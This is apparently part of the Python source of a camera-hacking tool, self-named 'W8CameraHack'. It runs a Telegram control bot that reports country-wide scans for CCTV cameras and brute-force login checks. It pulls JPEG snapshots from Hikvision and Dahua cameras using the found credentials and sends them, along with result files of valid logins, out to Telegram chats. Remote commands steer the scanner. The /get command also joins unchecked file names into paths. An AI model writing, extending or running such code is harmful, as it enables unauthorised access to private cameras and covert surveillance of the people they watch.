def _flush_camera_batch():
    """Flush batched camera detections as a single Telegram message"""
    global _telegram_camera_batch, _telegram_batch_timer
    with _telegram_batch_lock:
        batch = _telegram_camera_batch[:]
        _telegram_camera_batch = []
        _telegram_batch_timer = None
    if not batch:
        return
    if len(batch) == 1:
        msg = f"📹 <b>Camera Detected:</b>\n{batch[0]}"
    else:
        msg = f"📹 <b>{len(batch)} Cameras Found!</b>\n\n"
        for i, entry in enumerate(batch[:20], 1):
            msg += f"{entry}\n"
        if len(batch) > 20:
            msg += f"\n... and {len(batch) - 20} more cameras"
    try:
        telegram_queue.put_nowait({"type": "message", "message": msg})
    except queue.Full:
        pass

def _schedule_batch_flush():
    """Schedule a batch flush after TELEGRAM_BATCH_INTERVAL seconds"""
    global _telegram_batch_timer
    if _telegram_batch_timer is None or not _telegram_batch_timer.is_alive():
        _telegram_batch_timer = threading.Timer(TELEGRAM_BATCH_INTERVAL, _flush_camera_batch)
        _telegram_batch_timer.daemon = True
        _telegram_batch_timer.start()

_telegram_session             = None
_telegram_session_lock        = threading.Lock()
_telegram_session_created_at  = 0.0
_telegram_session_req_count   = 0
_SESSION_MAX_AGE_SEC          = 600   # proactively recycle after 10 minutes
_SESSION_MAX_REQUESTS         = 300   # proactively recycle after 300 requests

def _build_telegram_session():
    """Build a fresh requests.Session tuned for Telegram API reliability.

    Key improvements over a bare Session:
    - urllib3 Retry adapter handles transient 5xx / network blips at transport
      layer before application-level retry logic runs.
    - pool_connections=4 / pool_maxsize=8 keeps a modest idle pool that covers
      the single background worker without exhausting file descriptors.
    - pool_block=False lets urllib3 open a temporary extra connection instead of
      blocking when every pool slot is busy.
    - Explicit Connection: keep-alive header ensures the server keeps the TCP
      socket open between requests.
    """
    try:
        from urllib3.util.retry import Retry as _Retry
        _urllib3_retry = _Retry(
            total=3,
            read=3,
            connect=3,
            backoff_factor=0.5,            # 0.5 s, 1 s, 2 s between retries
            status_forcelist=(500, 502, 503, 504),
            raise_on_status=False,
            allowed_methods={"POST", "GET"},
        )
    except Exception:
        _urllib3_retry = 0  # fallback — no urllib3 retry

    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=4,
        pool_maxsize=8,
        max_retries=_urllib3_retry,
        pool_block=False,
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.headers.update({
        "Connection": "keep-alive",
        "User-Agent": "W8CameraHack/3",
    })
    return s

def _get_telegram_session():
    """Return the shared Telegram session, proactively recycling it when it is
    too old or has served too many requests (prevents stale keep-alive issues)."""
    global _telegram_session, _telegram_session_created_at, _telegram_session_req_count
    with _telegram_session_lock:
        now = time.time()
        _stale = (
            _telegram_session is None
            or now - _telegram_session_created_at > _SESSION_MAX_AGE_SEC
            or _telegram_session_req_count >= _SESSION_MAX_REQUESTS
        )
        if _stale:
            if _telegram_session is not None:
                try:
                    _telegram_session.close()
                except Exception:
                    pass
            _telegram_session            = _build_telegram_session()
            _telegram_session_created_at = now
            _telegram_session_req_count  = 0
        _telegram_session_req_count += 1
        return _telegram_session

def _reset_telegram_session():
    """Force-close and recreate the shared session (called after connection errors)."""
    global _telegram_session, _telegram_session_created_at, _telegram_session_req_count
    with _telegram_session_lock:
        if _telegram_session is not None:
            try:
                _telegram_session.close()
            except Exception:
                pass
        _telegram_session            = _build_telegram_session()
        _telegram_session_created_at = time.time()
        _telegram_session_req_count  = 0

def _telegram_send_with_retry(fn, dest_name, max_retries=4, delays=None):
    """Execute fn() with exponential backoff + jitter on network/pool errors.

    Improvements over the previous version:
    - Catches pool-exhaustion errors (urllib3 MaxRetryError / ProtocolError)
      and resets the session — these appear as ConnectionError wrappers.
    - Distinguishes timeout vs connection errors so each gets appropriate wait.
    - Jitter is capped per error type to prevent thundering-herd restarts.
    - Returns (success, response_or_None).
    """
    import random as _random
    if delays is None:
        delays = [3, 8, 15, 25]

    # All error types that indicate a broken/exhausted connection
    _CONN_ERRORS = (
        requests.exceptions.ConnectionError,
        requests.exceptions.ChunkedEncodingError,
        ConnectionResetError,
        BrokenPipeError,
        OSError,
    )

    wait = 0.0
    for attempt in range(max_retries):
        try:
            resp = fn()
            # Telegram rate-limit: back off as instructed
            if resp.status_code == 429:
                retry_after = min(
                    int(resp.json().get("parameters", {}).get("retry_after", 10)),
                    90
                )
                time.sleep(retry_after)
                continue
            return True, resp

        except requests.exceptions.Timeout as e:
            wait = delays[min(attempt, len(delays) - 1)] + _random.uniform(0, 2)
            _log_tg_err(f"[{dest_name}] Attempt {attempt+1}/{max_retries} — Timeout: {str(e)[:80]} — retry {wait:.1f}s")

        except _CONN_ERRORS as e:
            wait = delays[min(attempt, len(delays) - 1)] + _random.uniform(0, 3)
            _log_tg_err(f"[{dest_name}] Attempt {attempt+1}/{max_retries} — ConnErr: {str(e)[:80]} — retry {wait:.1f}s")
            _reset_telegram_session()   # discard stale/exhausted pool

        except Exception as e:
            _log_tg_err(f"[{dest_name}] Unhandled error: {str(e)[:100]}")
            return False, None

        if attempt < max_retries - 1:
            time.sleep(wait)
        else:
            _log_tg_err(f"[{dest_name}] Gave up after {max_retries} attempts")
            return False, None

    return False, None


def _log_tg_err(msg: str) -> None:
    """Append a timestamped line to telegram_error.log (best-effort)."""
    try:
        with open(os.path.join(SCRIPT_DIR, "telegram_error.log"), "a", encoding="utf-8") as _f:
            _f.write(f"{datetime.now()}: {msg}\n")
    except Exception:
        pass

def _telegram_worker():
    """Background worker that processes Telegram messages from the queue.
    Runs in a separate daemon thread so it never blocks scanner threads.
    Uses exponential backoff retry on network errors."""
    last_send_time   = 0
    min_interval_message = 0.5
    min_interval_photo   = 3.0
    # ── Pool health watchdog ───────────────────────────────────────────────────
    # Count consecutive tasks where every destination send failed.  After 5 in
    # a row we force a full session reset so a persistently exhausted pool never
    # silently blocks alerts forever.
    _consec_fails = 0
    _CONSEC_FAIL_THRESHOLD = 5
    while True:
        try:
            task = telegram_queue.get(timeout=2)
            if task is None:
                break
            task_type = task.get("type")
            destinations = TELEGRAM_CONFIG.get("destinations", [])

            if not destinations:
                telegram_queue.task_done()
                continue

            min_interval = min_interval_photo if task_type == "photo" else min_interval_message
            now = time.time()
            wait = min_interval - (now - last_send_time)
            if wait > 0:
                time.sleep(wait)

            # Watchdog: if we've had too many consecutive send failures, force
            # a session recycle before attempting the next task.
            if _consec_fails >= _CONSEC_FAIL_THRESHOLD:
                _reset_telegram_session()
                _consec_fails = 0

            session = _get_telegram_session()
            _task_had_success = False

            for dest in destinations:
                if not dest.get("enabled", True):
                    continue
                bot_token = dest.get("bot_token", "")
                chat_id = dest.get("chat_id", "")
                dest_name = dest.get("name", "Unknown")

                if not bot_token or not chat_id:
                    continue

                if task_type == "message":
                    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    payload = {
                        "chat_id": chat_id,
                        "text": task["message"],
                        "parse_mode": "HTML"
                    }
                    def _send_msg(u=api_url, p=payload):
                        return session.post(u, json=p, timeout=(20, 45))
                    success, response = _telegram_send_with_retry(_send_msg, dest_name, max_retries=4)
                    if success:
                        _task_had_success = True
                        last_send_time = time.time()
                        if response.status_code == 200:
                            try:
                                resp_json = response.json()
                                msg_id = resp_json.get("result", {}).get("message_id")
                                scan_id = task.get("scan_id")
                                if msg_id and scan_id:
                                    _key = f"{chat_id}:{scan_id}"
                                    with _progress_msg_lock:
                                        _progress_msg_ids[_key] = msg_id
                            except Exception:
                                pass
                        else:
                            with open("telegram_error.log", "a") as f:
                                f.write(f"{datetime.now()}: [{dest_name}] HTTP {response.status_code} — {response.text[:120]}\n")

                elif task_type == "edit_message":
                    _scan_id = task.get("scan_id", "")
                    _key     = f"{chat_id}:{_scan_id}"
                    msg_id   = task.get("message_id")
                    if not msg_id:
                        with _progress_msg_lock:
                            msg_id = _progress_msg_ids.get(_key)

                    _need_new_msg = (msg_id is None)

                    if msg_id and not _need_new_msg:
                        # Try editing the existing pinned progress message
                        api_url = f"https://api.telegram.org/bot{bot_token}/editMessageText"
                        payload = {
                            "chat_id": chat_id,
                            "message_id": msg_id,
                            "text": task["message"],
                            "parse_mode": "HTML"
                        }
                        def _edit_msg(u=api_url, p=payload):
                            return session.post(u, json=p, timeout=(20, 45))
                        success, response = _telegram_send_with_retry(_edit_msg, dest_name, max_retries=3)
                        if success and response is not None:
                            if response.status_code == 200:
                                _task_had_success = True
                                last_send_time = time.time()
                            elif response.status_code == 400:
                                _err_desc = ""
                                try:
                                    _err_desc = response.json().get("description", "")
                                except Exception:
                                    pass
                                if "not found" in _err_desc or "message to edit" in _err_desc:
                                    # Progress message was deleted — clear stale ID and re-send fresh
                                    with _progress_msg_lock:
                                        _progress_msg_ids.pop(_key, None)
                                    _need_new_msg = True
                                else:
                                    # "message is not modified" — content unchanged, that's fine
                                    _task_had_success = True
                                    last_send_time = time.time()

                    if _need_new_msg:
                        # No stored message yet, or stale ID was cleared — send a brand new one
                        api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                        payload = {
                            "chat_id": chat_id,
                            "text": task["message"],
                            "parse_mode": "HTML"
                        }
                        def _send_new(u=api_url, p=payload):
                            return session.post(u, json=p, timeout=(20, 45))
                        success, response = _telegram_send_with_retry(_send_new, dest_name, max_retries=3)
                        if success and response is not None and response.status_code == 200:
                            _task_had_success = True
                            last_send_time = time.time()
                            try:
                                new_msg_id = response.json().get("result", {}).get("message_id")
                                if new_msg_id and _scan_id:
                                    with _progress_msg_lock:
                                        _progress_msg_ids[_key] = new_msg_id
                            except Exception:
                                pass

                elif task_type == "file":
                    file_path = task["file_path"]
                    if not os.path.exists(file_path):
                        continue
                    api_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                    caption = task.get("caption", "")
                    def _send_file(u=api_url, fp=file_path, cid=chat_id, cap=caption):
                        with open(fp, 'rb') as fh:
                            return session.post(u, files={"document": fh},
                                                data={"chat_id": cid, "caption": cap[:1024]},
                                                timeout=(25, 200))
                    success, response = _telegram_send_with_retry(_send_file, dest_name, max_retries=5,
                                                                   delays=[5, 12, 25, 45, 60])
                    if success:
                        _task_had_success = True
                        last_send_time = time.time()
                        if response.status_code == 404:
                            with open("telegram_error.log", "a") as f:
                                f.write(f"{datetime.now()}: [{dest_name}] File Error 404 — Invalid bot token\n")
                        elif response.status_code == 400:
                            with open("telegram_error.log", "a") as f:
                                f.write(f"{datetime.now()}: [{dest_name}] File Error 400 — Invalid chat_id or bot not in chat\n")
                        elif response.status_code != 200:
                            with open("telegram_error.log", "a") as f:
                                f.write(f"{datetime.now()}: [{dest_name}] File Error {response.status_code} — {response.text[:100]}\n")

                elif task_type == "photo":
                    image_bytes = task.get("image_bytes", b"")
                    caption = task.get("caption", "")
                    if not image_bytes:
                        continue
                    # Use sendDocument (not sendPhoto) to deliver original JPEG
                    # at full resolution — Telegram does NOT compress documents.
                    api_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                    def _send_photo(u=api_url, img=image_bytes, cid=chat_id, cap=caption):
                        return session.post(
                            u,
                            files={"document": ("snapshot.jpg", img, "image/jpeg")},
                            data={"chat_id": cid, "caption": cap[:1024], "parse_mode": "HTML"},
                            timeout=(25, 200)
                        )
                    success, response = _telegram_send_with_retry(_send_photo, dest_name, max_retries=6,
                                                                   delays=[5, 10, 20, 35, 50])
                    if success:
                        _task_had_success = True
                        last_send_time = time.time()
                        if response.status_code not in (200, 201):
                            _log_tg_err(f"[{dest_name}] Photo Error {response.status_code} — {response.text[:120]}")

            # ── Consecutive-failure watchdog update ────────────────────────────
            if _task_had_success:
                _consec_fails = 0
            else:
                _consec_fails += 1

            telegram_queue.task_done()
        except queue.Empty:
            continue
        except Exception:
            try:
                telegram_queue.task_done()
            except Exception:
                pass
            continue

def start_telegram_worker():
    """Start the background Telegram worker thread and command-polling thread."""
    global telegram_worker_thread
    if telegram_worker_thread is None or not telegram_worker_thread.is_alive():
        telegram_worker_thread = threading.Thread(target=_telegram_worker, daemon=True,
                                                  name="TgMsgWorker")
        telegram_worker_thread.start()
    start_telegram_cmd_handler()

def send_telegram_message(message: str):
    """Non-blocking: queues a message to be sent by the background worker.
    Drops message silently if queue is full to prevent blocking."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return
    start_telegram_worker()
    try:
        telegram_queue.put_nowait({"type": "message", "message": message})
    except queue.Full:
        pass

def send_telegram_camera_detection(ip, camera_type, port, model="", country_name="", country_code=""):
    """Batch camera detections to reduce Telegram API spam.
    Groups multiple detections into single messages."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    country_display = f"{country_name} ({country_code})" if country_code else country_name
    entry = f"🌍 <b>{country_display}</b> | {camera_type} | <code>{ip}:{port}</code>"
    if model:
        entry += f" | {model}"
    with _telegram_batch_lock:
        _telegram_camera_batch.append(entry)
        if len(_telegram_camera_batch) >= TELEGRAM_BATCH_SIZE:
            _flush_camera_batch()
        else:
            _schedule_batch_flush()

def send_telegram_edit_progress(message: str, scan_id: str = "default"):
    """Update the single live progress message in Telegram (editMessageText).
    First call sends a new message; subsequent calls edit it in place."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return
    start_telegram_worker()
    try:
        telegram_queue.put_nowait({"type": "edit_message", "message": message, "scan_id": scan_id})
    except queue.Full:
        pass

def reset_telegram_progress_msg(scan_id: str = "default"):
    """Clear stored progress message IDs so next scan starts fresh."""
    with _progress_msg_lock:
        keys_to_remove = [k for k in _progress_msg_ids if k.endswith(f":{scan_id}")]
        for k in keys_to_remove:
            del _progress_msg_ids[k]

def send_telegram_file(file_path: str, caption: str = ""):
    """Non-blocking: queues a file to be sent by the background worker"""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return
    if not os.path.exists(file_path):
        return
    start_telegram_worker()
    try:
        telegram_queue.put_nowait({"type": "file", "file_path": file_path, "caption": caption})
    except queue.Full:
        pass


def send_telegram_photo(image_bytes: bytes, caption: str = ""):
    """Non-blocking: queues a photo (raw JPEG bytes) to be sent via sendPhoto."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return
    if not image_bytes:
        return
    start_telegram_worker()
    try:
        telegram_queue.put_nowait({"type": "photo", "image_bytes": image_bytes, "caption": caption})
    except queue.Full:
        pass


def fetch_camera_snapshot(ip: str, port: int, username: str, password: str,
                          camera_type: str, timeout: float = 5.0) -> Optional[bytes]:
    """
    Attempt to grab a JPEG snapshot from a camera's built-in snapshot endpoint.
    Returns raw image bytes on success, or None if not available.
    """
    session = requests.Session()
    session.verify = False
    session.trust_env = False

    is_dahua = "Dahua" in camera_type or "Anjhua" in camera_type
    is_hikvision = "HIK" in camera_type or "Hikvision" in camera_type or "hik" in camera_type.lower()

    # Build ordered list of snapshot endpoints to try
    if is_hikvision:
        endpoints = [
            "/ISAPI/Streaming/channels/101/picture",
            "/ISAPI/Streaming/channels/1/picture",
            "/ISAPI/Streaming/channels/102/picture",
            "/snapshot",
            "/jpg/image.jpg",
            "/cgi-bin/jpeg.cgi",
        ]
    elif is_dahua:
        endpoints = [
            "/cgi-bin/snapshot.cgi",
            "/cgi-bin/snapshot.cgi?channel=0",
            "/cgi-bin/snapshot.cgi?channel=1",
            "/cgi-bin/mjpg/video.cgi?channel=1&subtype=0&.jpg",
            "/snapshot",
            "/jpg/image.jpg",
        ]
    else:
        # Generic / unknown — try all common paths
        endpoints = [
            "/cgi-bin/snapshot.cgi",
            "/ISAPI/Streaming/channels/101/picture",
            "/snapshot",
            "/jpg/image.jpg",
            "/image/jpeg.cgi",
            "/cgi-bin/jpeg.cgi",
            "/Streaming/Channels/101/picture",
            "/tmpfs/snap.jpg",
            "/onvif/snapshot",
        ]

    base_url = f"http://{ip}:{port}"
    auth_digest = HTTPDigestAuth(username, password)
    auth_basic_header = {
        "Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode()).decode()
    }

    for endpoint in endpoints:
        url = base_url + endpoint
        # Try Digest auth first, then Basic
        for auth_method in [auth_digest, auth_basic_header]:
            try:
                if isinstance(auth_method, dict):
                    resp = session.get(url, headers=auth_method, timeout=timeout,
                                       allow_redirects=True, stream=False)
                else:
                    resp = session.get(url, auth=auth_method, timeout=timeout,
                                       allow_redirects=True, stream=False)

                if resp.status_code == 200:
                    content_type = resp.headers.get("Content-Type", "").lower()
                    # Accept JPEG/image responses only
                    if "image" in content_type or "jpeg" in content_type or "jpg" in content_type:
                        data = resp.content
                        # Verify it's a real JPEG (starts with FF D8)
                        if data and len(data) > 500 and data[:2] == b'\xff\xd8':
                            return data
                    # Some cameras return image without correct content-type
                    elif resp.content and len(resp.content) > 500 and resp.content[:2] == b'\xff\xd8':
                        return resp.content
            except Exception:
                continue

    return None

def send_telegram_message_blocking(message: str):
    """Blocking version: sends to all enabled destinations with retry, used during shutdown."""
    if not TELEGRAM_CONFIG.get("enabled"):
        return
    destinations = TELEGRAM_CONFIG.get("destinations", [])
    if not destinations:
        return
    session = _get_telegram_session()
    for dest in destinations:
        if not dest.get("enabled", True):
            continue
        bot_token = dest.get("bot_token", "")
        chat_id = dest.get("chat_id", "")
        dest_name = dest.get("name", "Unknown")
        if not bot_token or not chat_id:
            continue
        api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        def _fn(u=api_url, p=payload):
            return session.post(u, json=p, timeout=(20, 45))
        _telegram_send_with_retry(_fn, dest_name, max_retries=4)


# ─── Telegram Command Handler (/status, /help) ───────────────────────────────

def _build_status_message() -> str:
    """Collect live scanner state and return a formatted HTML status string.
    Detects which mode is active: brute-force login check, IP scan, or idle."""
    now     = time.time()
    elapsed = now - start_time
    elapsed_str = (
        f"{int(elapsed)//3600}h {(int(elapsed)%3600)//60}m"
        if elapsed >= 3600 else f"{int(elapsed)//60}m {int(elapsed)%60}s"
    )
    err_rate = get_scan_error_rate()
    err_str  = f"{err_rate*100:.0f}%"

    # ── Mode: brute-force login check ─────────────────────────────────────────
    with _brute_active_lock:
        bf_file  = _active_brute_file
        bf_idx   = _active_brute_index
        bf_total = _active_brute_total
        bf_cc    = _active_brute_country_code

    if bf_file and bf_total > 0:
        pct   = int(bf_idx * 100 / bf_total) if bf_total else 0
        speed = bf_idx / elapsed if elapsed > 0 else 0
        eta_s = int((bf_total - bf_idx) / speed) if speed > 0 else 0
        eta   = (f"{eta_s//3600}h {(eta_s%3600)//60}m" if eta_s >= 3600
                 else f"{eta_s//60}m {eta_s%60}s" if eta_s >= 60
                 else f"{eta_s}s")
        with results_lock:
            found = len(valid_results)
        msg  = f"🔑 <b>Login-Check Scan — Live Status</b>\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"📂 File: <code>{os.path.basename(bf_file)}</code>\n"
        if bf_cc:
            msg += f"🌍 Country: <b>{bf_cc}</b>\n"
        msg += f"🔍 Checked: <b>{bf_idx:,} / {bf_total:,}</b> ({pct}%)\n"
        msg += f"✅ Valid Logins: <b>{found}</b>\n"
        msg += f"🚀 Speed: {speed:.1f} cam/s\n"
        msg += f"⏱ Elapsed: {elapsed_str}\n"
        msg += f"🏁 ETA: {eta}\n"
        msg += f"📊 Error Rate: {err_str}\n"
        with _remote_thread_override_lock:
            _thr = _remote_thread_override
        msg += f"🧵 Threads: {'adaptive' if _thr == 0 else str(_thr) + ' (forced)'}\n"
        msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return msg

    # ── Mode: IP scan ──────────────────────────────────────────────────────────
    with results_lock:
        scanned = scanned_count
        found   = len(valid_results)
    total = total_ips
    if total > 0:
        pct   = int(scanned * 100 / total) if total else 0
        speed = scanned / elapsed if elapsed > 0 else 0
        eta_s = int((total - scanned) / speed) if speed > 0 else 0
        eta   = (f"{eta_s//3600}h {(eta_s%3600)//60}m" if eta_s >= 3600
                 else f"{eta_s//60}m {eta_s%60}s" if eta_s >= 60
                 else f"{eta_s}s")
        country = ""
        if selected_country:
            country = (f"{selected_country.get('name', '')} "
                       f"({selected_country.get('code', '')})")
        elif current_country_name and current_country_name != "Unknown":
            country = f"{current_country_name} ({current_country_code})"
        msg  = f"🌐 <b>IP Scan — Live Status</b>\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
        if country:
            msg += f"🌍 Country: <b>{country}</b>\n"
        msg += f"🔍 Scanned: <b>{scanned:,} / {total:,}</b> ({pct}%)\n"
        msg += f"📹 Cameras Found: <b>{found}</b>\n"
        msg += f"🚀 Speed: {speed:.1f} IP/s\n"
        msg += f"⏱ Elapsed: {elapsed_str}\n"
        msg += f"🏁 ETA: {eta}\n"
        msg += f"📊 Error Rate: {err_str}\n"
        with _remote_thread_override_lock:
            _thr = _remote_thread_override
        msg += f"🧵 Threads: {'adaptive' if _thr == 0 else str(_thr) + ' (forced)'}\n"
        msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return msg

    # ── Mode: idle ─────────────────────────────────────────────────────────────
    return (
        f"💤 <b>Scanner Idle</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"No scan is currently running.\n"
        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )


def _telegram_cmd_reply(bot_token: str, chat_id: str, text: str) -> None:
    """Send a direct reply for a bot command (bypasses the queue for instant response)."""
    try:
        api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        session = _get_telegram_session()
        def _fn(u=api_url, p=payload):
            return session.post(u, json=p, timeout=(10, 30))
        _telegram_send_with_retry(_fn, f"cmd:{chat_id}", max_retries=3)
    except Exception:
        pass


def _telegram_cmd_worker() -> None:
    """Long-polling background thread that reads incoming Telegram messages
    and responds to bot commands instantly.

    Supported commands
    ------------------
    /status  — live scan progress (mode, country, progress %, speed, ETA, error rate)
    /help    — list of available commands

    Security: only chat_ids already listed in TELEGRAM_CONFIG destinations are
    answered — strangers are silently ignored even if they know the bot token.

    The thread uses Telegram's long-polling (getUpdates?timeout=30) which blocks
    the HTTP request on Telegram's side for up to 30 s when there are no messages,
    so it consumes essentially no CPU while idle.
    """
    offset       = 0
    poll_timeout = 30

    def _allowed_ids() -> set:
        return {
            str(d["chat_id"])
            for d in TELEGRAM_CONFIG.get("destinations", [])
            if d.get("enabled", True) and d.get("chat_id")
        }

    def _first_active_dest():
        for d in TELEGRAM_CONFIG.get("destinations", []):
            if d.get("enabled", True) and d.get("bot_token") and d.get("chat_id"):
                return d
        return None

    while True:
        try:
            dest = _first_active_dest()
            if not dest:
                time.sleep(10)
                continue

            bot_token = dest["bot_token"]
            poll_url  = (f"https://api.telegram.org/bot{bot_token}/getUpdates")

            try:
                session = _get_telegram_session()
                resp = session.get(
                    poll_url,
                    params={
                        "offset":          offset,
                        "timeout":         poll_timeout,
                        "allowed_updates": '["message"]',
                    },
                    timeout=(5, poll_timeout + 10),
                )
            except requests.exceptions.Timeout:
                # Long-poll timeout is completely normal — just loop again
                continue
            except requests.exceptions.ConnectionError:
                _reset_telegram_session()
                time.sleep(10)
                continue
            except Exception:
                time.sleep(5)
                continue

            if resp.status_code != 200:
                time.sleep(5)
                continue

            data = resp.json()
            if not data.get("ok"):
                time.sleep(5)
                continue

            allowed = _allowed_ids()
            for update in data.get("result", []):
                update_id = update.get("update_id", 0)
                offset    = max(offset, update_id + 1)

                msg_obj   = update.get("message", {})
                text      = (msg_obj.get("text") or "").strip()
                from_chat = str(msg_obj.get("chat", {}).get("id", ""))

                # Security: ignore messages from unknown chat IDs
                if from_chat not in allowed:
                    continue

                # Find the matching destination so we reply with the right token
                reply_dest = next(
                    (d for d in TELEGRAM_CONFIG.get("destinations", [])
                     if d.get("enabled", True)
                     and str(d.get("chat_id", "")) == from_chat
                     and d.get("bot_token")),
                    None,
                )
                if not reply_dest:
                    continue

                reply_token = reply_dest["bot_token"]
                cmd = text.split()[0].lower() if text.startswith("/") else ""

                if cmd in ("/status", f"/status@{bot_token.split(':')[0]}"):
                    _telegram_cmd_reply(reply_token, from_chat, _build_status_message())

                elif cmd in ("/list", "/files",
                             f"/list@{bot_token.split(':')[0]}"):
                    # List all result txt files on disk
                    _result_files = []
                    try:
                        for _fname in sorted(os.listdir(SCRIPT_DIR)):
                            if _fname.endswith(".txt") and any(
                                x in _fname for x in ["CCTV", "Valid", "Camera"]
                            ):
                                _fpath   = os.path.join(SCRIPT_DIR, _fname)
                                _size_kb = os.path.getsize(_fpath) // 1024
                                _mtime   = datetime.fromtimestamp(
                                    os.path.getmtime(_fpath)
                                ).strftime("%m-%d %H:%M")
                                _result_files.append(
                                    f"📄 {_fname} ({_size_kb} KB) [{_mtime}]"
                                )
                    except Exception:
                        pass
                    if _result_files:
                        _list_reply = (
                            "📂 <b>Available Result Files</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            + "\n".join(_result_files)
                            + "\n\n/get &lt;filename&gt; — download a file"
                        )
                    else:
                        _list_reply = "📭 No result files found yet."
                    _telegram_cmd_reply(reply_token, from_chat, _list_reply)

                elif text.lower().startswith("/get "):
                    # Download a result file by name
                    _req_name = text[5:].strip()
                    _req_path = os.path.join(SCRIPT_DIR, _req_name)
                    if os.path.exists(_req_path):
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            f"📤 Sending: <code>{_req_name}</code>"
                        )
                        send_telegram_file_blocking(_req_path, f"📤 {_req_name}")
                    else:
                        # Case-insensitive fallback
                        try:
                            _matches = [
                                f for f in os.listdir(SCRIPT_DIR)
                                if f.lower() == _req_name.lower()
                            ]
                        except Exception:
                            _matches = []
                        if _matches:
                            _fp = os.path.join(SCRIPT_DIR, _matches[0])
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"📤 Sending: <code>{_matches[0]}</code>"
                            )
                            send_telegram_file_blocking(_fp, f"📤 {_matches[0]}")
                        else:
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"❌ File not found: <code>{_req_name}</code>\n"
                                f"Use /list to see available files."
                            )

                elif cmd in ("/stop", f"/stop@{bot_token.split(':')[0]}"):
                    _telegram_cmd_reply(
                        reply_token, from_chat,
                        "⏹ <b>Stop signal sent.</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "Scanner will finish current tasks,\n"
                        "save progress, and halt gracefully.\n"
                        "🕒 " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    )
                    # Mirror exactly what Ctrl+C does
                    _stop_requested.set()
                    try: _flush_camera_batch()
                    except Exception: pass
                    try: save_cred_success_stats()
                    except Exception: pass
                    try:
                        save_scan_progress(
                            country_code=selected_country.get('code','') if selected_country else '',
                            country_name=selected_country.get('name','') if selected_country else '',
                            scanned=scanned_count,
                            total=total_ips,
                            last_ip_index=_current_range_idx,
                            last_ip_in_range=_last_scanned_ip_global,
                            output_file=cctv_output_file or '',
                            stop_reason='user_stopped'
                        )
                    except Exception: pass
                    try:
                        with _brute_active_lock:
                            if _active_brute_file and _active_brute_total > 0 and _active_brute_index > 0:
                                save_brute_progress(
                                    input_file=_active_brute_file,
                                    country_code=_active_brute_country_code,
                                    last_camera_index=_active_brute_index,
                                    total_cameras=_active_brute_total
                                )
                    except Exception: pass

                elif cmd in ("/pause", f"/pause@{bot_token.split(':')[0]}"):
                    if _stop_requested.is_set():
                        _telegram_cmd_reply(reply_token, from_chat,
                            "⚠️ Scanner is already stopping — cannot pause.")
                    elif _scan_paused.is_set():
                        _telegram_cmd_reply(reply_token, from_chat,
                            "⏸ Scan is already paused. Send /resume to continue.")
                    else:
                        _scan_paused.set()
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            "⏸ <b>Scan paused.</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            "Current tasks will finish, then scanner waits.\n"
                            "Send /resume to continue.\n"
                            "🕒 " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )

                elif cmd in ("/resume", f"/resume@{bot_token.split(':')[0]}"):
                    if not _scan_paused.is_set():
                        _telegram_cmd_reply(reply_token, from_chat,
                            "▶️ Scan is not paused — already running.")
                    else:
                        _scan_paused.clear()
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            "▶️ <b>Scan resumed.</b>\n"
                            "🕒 " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )

                elif cmd in ("/threads", f"/threads@{bot_token.split(':')[0]}"):
                    global _remote_thread_override
                    parts = text.split()
                    if len(parts) >= 2 and parts[1].lstrip('-').isdigit():
                        n = int(parts[1])
                        if n <= 0:
                            # 0 or negative = clear override, return to adaptive
                            with _remote_thread_override_lock:
                                _remote_thread_override = 0
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                "🧵 <b>Thread override cleared.</b>\n"
                                "Scanner is back to adaptive mode."
                            )
                        else:
                            n = min(n, 500)
                            with _remote_thread_override_lock:
                                _remote_thread_override = n
                            _telegram_cmd_reply(
                                reply_token, from_chat,
                                f"🧵 <b>Threads set to {n}</b>\n"
                                "Takes effect at the next 100-range interval.\n"
                                "Send /threads 0 to return to adaptive mode."
                            )
                    else:
                        with _remote_thread_override_lock:
                            _cur = _remote_thread_override
                        _cur_str = (f"<b>{_cur}</b> (forced)"
                                    if _cur > 0 else "<b>adaptive</b>")
                        _telegram_cmd_reply(
                            reply_token, from_chat,
                            f"🧵 Current threads: {_cur_str}\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                            "Usage: /threads 50\n"
                            "Send /threads 0 to return to adaptive mode."
                        )

